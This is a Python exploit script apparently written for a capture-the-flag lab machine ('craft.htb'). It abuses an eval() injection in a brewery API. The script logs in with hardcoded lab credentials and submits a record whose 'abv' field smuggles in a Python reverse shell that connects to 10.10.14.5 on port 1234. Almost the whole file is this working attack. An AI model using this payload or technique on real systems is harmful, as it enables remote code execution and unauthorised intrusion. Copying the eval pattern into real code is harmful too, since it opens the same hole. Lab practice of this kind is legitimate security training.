#!/usr/bin/python3

import json
import requests
from requests.auth import HTTPBasicAuth

# CREDS
dinesh   = {'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}
erlich   = {'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}
gilfoyle = {'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'} # USED FOR GITHUB LOGIN!

# URLS
## Base
base_url = 'https://api.craft.htb/api/'

## Auth
check    = base_url + 'auth/check'# GET
login    = base_url + 'auth/login'# GET

## Brews
all_brew = base_url + 'brew/'      # GET
new_brew = base_url + 'brew/'      # POST
del_brew = base_url + 'brew/<id>' # DELETE
get_brew = base_url + 'brew/<id>' # GET
upd_brew = base_url + 'brew/<id>' # PUT

# REVERSE SHELL
## Python Code
rev_shell = 'exec(\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\')'

## Malicious brew
mal_brew = {'brewer': 'pisslords', 'name': 'piss', 'style': 'man this tastes like piss', 'abv': rev_shell}

def login_auth(user, password):
    return requests.get(login, auth=HTTPBasicAuth(user, password), verify=False)

def check_auth(tok):
    return requests.get(check, headers={'X-Craft-API-Token': tok}, verify=False)

def list_brews():
    return requests.get(all_brew, verify=False)

# VULNERABLE!!!
# Code found from https://gogs.craft.htb/Craft/craft-api/src/master/craft_api/api/brew/endpoints/brew.py - line 43
# if eval('%s > 1' % request.json['abv']):
# evals the 'abv' parameter
def add_brew(brew_dict, token):
    json_data = json.dumps(brew_dict)
    return requests.post(new_brew, headers={'X-Craft-API-Token': token, 'Content-Type': 'application/json'}, data=json_data, verify=False)

def del_brew(brew_id):
    return requests.delete(del_brew.replace('<id>', brew_id), verify=False)

def get_brew(brew_id):
    return requests.get(get_brew.replace('<id>', brew_id), verify=False)

def upd_brew(brew_id, brew_dict):
    return requests.put(upd_brew.replace('<id>', brew_idc), params=brew_dict, verify=False)

def get_shell():
    a = login_auth(dinesh['username'], dinesh['password'])
    print( '[*] Response code: {}'.format(a.status_code) )
    token = json.loads(a.text)['token']
    sh = add_brew(mal_brew, token)
    print( '[*] Response code: {}'.format(sh.status_code) )

if __name__=="__main__":
    get_shell()
